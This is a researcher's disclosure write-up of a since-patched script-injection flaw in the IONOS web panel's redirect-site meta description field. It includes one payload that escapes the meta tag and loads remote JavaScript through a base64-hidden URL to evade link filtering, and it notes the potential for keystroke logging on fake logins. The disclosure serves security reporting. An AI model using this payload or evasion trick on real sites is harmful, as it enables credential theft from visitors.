# JSPayload
**NOTE:** This exploit has been reported to IONOS and as of 10th February 2020 this exploit is no longer possible. Thanks to the security team at 1&1 for patching this!

## The Exploit

IONOS Webpanel did not santitise or parse any HTML written into the "Short Description" meta tag for redirect sites. This allowed an attacked to inject malicious javascript into a site which could then execute external javascript pulled from any other server. 
![IONOS Web Panel](https://i.imgur.com/KRsu6ab.png)
This exploit allowed an attacked to run any javascript they wanted on a page where other pages were loaded in as an Iframe. This means they could fool a user into thinking they were logging into a legitimate service, when the attacker has malicious javascript logging keyboard input.
![Firefox Developer tools showing JS has been injected to the site.](https://i.imgur.com/OxgeoaI.png)
The interesting thing was that the IONOS web panel **DID** check for links!  But this could be easily circumvented via obfuscation with base64, using js to deobfuscate the B64 back into a url and inject it into the page programatically. The code to do so was:
```js
**"/><script id="j"></script><script id="f"></script><script id="c"></script><script>document.getElementById("c").setAttribute("src",atob("aHR0cHM6Ly9yYXcuZ2l0aGFjay5jb20vVGlrdmFoVGVybWluYXRvci9KU1BheWxvYWQvbWFzdGVyL3BheWxvYWQuanM=");</script><meta name="**
```
This set up two script tags to be injected into by the external JS with IDs to be selected, and then simply injected the JS! 


## How did you discover this?

It's daft, but I was trying to put a favicon as an icon for a CTF page through redirect, when i realised that the \<meta> tag could be escaped, and that \<script> tags could written, and using JS, inject more javascript from an external source into the webpage! Isn't web security neat!

## When was this disclosed.
I disclosed this the day I found it out on 28th of January 2020 by calling and Emailing 1&1. IONOS responded to me via twitter [@bufferrodentflo](https://twitter.com/BufferRodentFlo) and i explained it to them from there :)

## Thanks
Special thanks to [Ch0p5u3y](https://github.com/Ch0p5u3y) & J.A Day for listening to my ramblings as I talked outloud about this to them and realised the B64 method! 
